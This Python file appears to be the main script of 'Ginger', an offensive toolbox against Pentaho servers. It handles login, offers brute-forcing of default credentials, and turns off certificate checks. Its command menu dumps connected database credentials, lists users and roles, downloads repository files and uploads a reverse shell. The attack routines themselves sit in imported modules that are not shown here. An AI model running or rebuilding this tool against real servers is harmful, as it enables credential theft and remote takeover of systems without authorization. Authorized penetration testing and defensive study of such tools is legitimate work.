#!/usr/bin/python3

import argparse
import json
#import re
import requests
import sys
import time
import traceback
import zipfile

from colorama import Fore
from colorama import init
from urllib3.exceptions import InsecureRequestWarning

from pathlib import Path

# Import Ginger modules
from modules import config


from modules.auth.bruteforce import bruteforce_defaults
from modules.auth.login import login
from modules.data_extraction import get
from modules.data_extraction import probe

# TO TEST
from modules.rce.shell_upload import shell_upload

# Colorama
init(autoreset=True)



def print_logo():
	print (f"""{Fore.YELLOW}   _____   _                               
  / ____| (_)                              
 | |  __   _   _ __     __ _    ___   _ __ 
 | | |_ | | | | '_ \   / _` |  / _ \ | '__|
 | |__| | | | | | | | | (_| | |  __/ | |   
  \_____| |_| |_| |_|  \__, |  \___| |_|   
                        __/ |              
                       |___/               """)

def main():
	parser = argparse.ArgumentParser(description='## Ginger, a Pentaho Hacking Toolbox ##')
	parser.add_argument('pentaho_path', help='address of the server to connect to Es: http://localhost:8080/pentaho')
	parser.add_argument('-u', dest='username', help='a valid username', default='')
	parser.add_argument('-p', dest='password', help='valid password for a given username', default='')
	
	parser.add_argument('--anon', dest='force_anon', help='Allow commands for authenticated users even for anonymous', action='store_false')
	parser.add_argument('--cookie', dest='cookie', help='Provide Cookie to login with', default='')
	
	args = parser.parse_args()
	config.username = args.username
	config.password = args.password
	config.pentaho_path = args.pentaho_path
	config.is_anon = args.force_anon
	
	
	print_logo()
	config.session = requests.session()
	
	
	
	# Disable check of self-signed certificates
	# Suppress only the single warning from urllib3 needed.
	requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
	config.session.verify = False
	
	
	
	try:
		# Login Cookie not set
		if args.cookie == '':
			# try to connect to the target
			print (f"Trying login with {config.username} / {config.password}")
			if login (config.username, config.password) != True:
				#Login failed
				print('Sorry, login failed. Try to login default credentials?')
				choice = input('~? [y / N] ')
				if choice == 'Y' or choice == 'y':
					if bruteforce_defaults() == False:
						print ('Sorry, no valid user found, falling back to anonymous mode')
						config.username == 'Anonymous'
					else:
						config.is_anon = False
				else:
					print ('Falling back to Anonymous mode')
					config.username == 'Anonymous'
			else:
				config.is_anon = False
		else:
			#Login cookie set
			config.username == 'Cookie'
			login_cookie = args.cookie.split('=')
			config.session.cookies.update({login_cookie[0]: login_cookie[1]})
			
		# Create a directory to store all the reports
		config.dirname = './reports/' + config.pentaho_path.replace('://', '_').replace('.', '_').replace('/', '_').replace(':', '_') + '/' + config.username
		Path(config.dirname).mkdir(parents=True, exist_ok=True)
		
		# Loop to show main menu
		choice = ''
		while choice != 'quit' and choice != 'exit':
			choice = input('~# ')
			if choice == 'help':
				print ('Available commands:')
				print ('api					try to list available API calls, even as Anonymous user')
				if config.is_anon == False:
					print ('dbs					list all connected db credentials')
					print ('files					list all available files in repository')
					print ('permissions				get permisison of current user')
					print ('repository {file}					Get the content of the specified file from the repository (see \'files\')')
					print ('shell				upload a reverse shell')
					print ('usernames			list all valid usernames')
					print ('userroles			list all valid usernames and valid roles')
				print ('version				show Pentaho Version')
			elif choice == 'api':
				probe.api()
			elif choice == 'dbs':
				get.db_credentials()
			elif choice == 'files':
				probe.repository_files('/')
			elif choice == 'permissions':
				probe.permissions()
			elif choice.startswith('repository'):
				get.repository_file_download(choice.split(' ')[1])
			elif choice == 'shell':
				shell_upload()
			elif choice == 'usernames':
				get.usernames()
			elif choice == 'userroles':
				get.userroles()
			elif choice == 'version':
				get.version()
			
		

	except Exception as fail:
		print("connection problem")
		print (fail)
		tb = traceback.format_exc()
		print (tb)
		sys.exit(1)

if __name__ == '__main__':
	try:
		main()
	except KeyboardInterrupt:
		print()